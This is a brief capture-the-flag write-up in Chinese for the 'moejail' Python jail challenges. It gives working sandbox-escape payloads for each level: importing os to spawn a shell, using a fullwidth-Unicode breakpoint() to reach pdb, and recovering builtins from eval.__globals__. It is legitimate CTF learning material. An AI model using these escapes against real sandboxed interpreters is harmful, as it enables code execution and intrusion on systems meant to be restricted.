# moejail系列部分题目

## moejail_lv2

`__import__(input()).system(input())`

flag还在`/tmp`目录下，不过没有以`.`开头（是的lv1我被这个`.`开头的flag唬了好久）

## moejail_lv2.5

`eval(input())`然后`__import__('os').system('sh')`

## moejail_lv3

```
Give me your code: ｂｒｅａｋｐｏｉｎｔ()
--Return--
> <string>(1)<module>()->None
(Pdb) import os
(Pdb) os.system("sh")
cat /tmp/t*
```

## moejail_lv4

见 https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes#no-builtins 。提供了一个自定义eval函数，就能从这个函数里取出builtins

`eval.__globals__["__builtins__"].__import__("os").system("sh")`